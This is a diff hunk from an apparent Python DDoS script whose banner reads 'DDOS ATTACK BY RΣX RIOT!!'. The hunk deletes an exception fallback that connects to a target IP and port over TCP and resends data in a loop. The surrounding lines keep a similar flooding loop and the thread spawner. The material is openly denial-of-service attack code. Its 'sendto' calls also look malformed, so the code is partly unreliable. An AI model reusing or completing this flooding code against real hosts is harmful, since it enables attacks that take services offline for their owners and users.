@@ -38,11 +38,6 @@ def ppx():
   			sock.sendto(data,datab,apa)
   		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
   	except:
-  		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  		sock.connect((ip,port))
-  		sock.sendto(data,datab,apa)
-  		for x in range(times):
-  			sock.sendto(data,datab,apa)
   		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
               
 for y in range(threads):
